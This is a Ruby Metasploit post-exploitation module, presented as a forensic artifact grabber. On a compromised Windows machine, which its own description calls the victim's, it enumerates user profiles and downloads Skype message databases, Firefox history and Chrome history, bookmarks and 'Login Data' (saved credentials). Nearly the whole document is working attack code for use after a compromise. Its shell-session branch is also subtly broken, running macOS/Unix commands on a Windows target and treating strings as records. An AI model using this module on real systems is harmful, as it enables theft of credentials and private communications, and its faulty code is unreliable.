##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'csv'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/post/windows/registry'


class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
        'Name' => 'grab_artifacts [checks for and grabs forensically-interesting artifacts]',
        'Description' => %q{'Captures forensically-interesting data from the victim machine.'},
        'License' => MSF_LICENSE,
        'Author' => [ 'Joshua Harper GCFE GCFA GSEC PI, Lt. West Campus Cyber Command, University of Texas Austin (@JonValt) <josh at radixtx dot com>'],
        'Platform' => %w{ win },
        'SessionTypes' => [ 'meterpreter', 'shell' ]
      ))
    register_advanced_options(
      [
        # Set as an advanced option since it can only be useful in shell sessions.
        OptInt.new('TIMEOUT', [true ,'Timeout in seconds when downloading file on a shell session.', 120]),
      ], self.class)
  end
 
  #Generic Ruby Stuff for my personal reference
 
  def run
    print_status("Hello from Metasploit! It is a pleasure to serve you today.")
    print_status("Grabbing User Profiles")
    grab_user_profiles().each do |p|
       skype_download = download_artifact("AppData",p,"skype", "Skype", "main.db", "binary/db") if check_artifact(p['AppData'],p['UserName'],"skype", "Skype")
       firefox_download = download_artifact("AppData",p,"Firefox", "Mozilla", "places.sqlite","binary/db") if check_artifact(p['AppData'],p['UserName'],"Firefox","Mozilla")
       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "History.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Login Data.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Archived History","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Bookmarks","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
    end
  end   
    
 
  
def check_artifact(path, user, artifact_name, artifact_dir)
   print_status("Checking for #{artifact_name} artifacts...")
   dirs = []
    if session.type =~ /meterpreter/
      session.fs.dir.foreach(path) do |d|
        dirs << d
      end
    else
      dirs = cmd_exec("ls -m \"#{path}\"").split(", ")
    end
   dirs.each do |dir|
    if dir == artifact_dir
        print_good("#{artifact_name} directory found for #{user}")
        return true
    end
   end
    print_error("#{artifact_name} directory not found for #{user}")
    return false
  end

    # Download Artifact's forensically-interesting file using store_local to preserve filename and some forensic metadata and make it easier to use with forensics software

  def download_artifact(path, profile, artifact_name, artifact_dir, artifact_filename, artifact_filetype)
    if session.type =~ /meterpreter/
      file = session.fs.file.search("#{profile[path]}\\#{artifact_dir}","#{artifact_filename}",true)
    else
      file = cmd_exec("mdfind","-onlyin #{profile['dir']} -name #{artifact_filename}").split("\n").collect {|p| if p =~ /#{artifact_dir}\/\w*\/#{artifact_filename}$/; p; end }.compact
    end
    file.each do |db|
    guid = db['path'].split ('\\')
    file_loc = store_local("artifact","#{artifact_filetype}",session,"#{profile['UserName']}_#{artifact_name}_#{guid.last}_#{artifact_filename}")
      if session.type =~ /meterpreter/
        maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
        print_status("Downloading #{maindb}")
        session.fs.file.download_file(file_loc,maindb)
      else
        print_status("Downloading #{db}")
        # Giving it 2 minutes to download since the file could be several MB
        maindb = cmd_exec("cat", "\"#{db}\"", datastore['TIMEOUT'])
        if maindb.nil?
          print_error("Could not download the file. Set the TIMEOUT option to a higher number.")
          return
        end
        output = ::File.open(file_loc, "wb")
        maindb.each_line do |d|
          output.puts(d)
        end
        output.close
      end
      print_good("#{artifact_name} artifact file saved to #{file_loc}")
    return file_loc
    end
  end
end

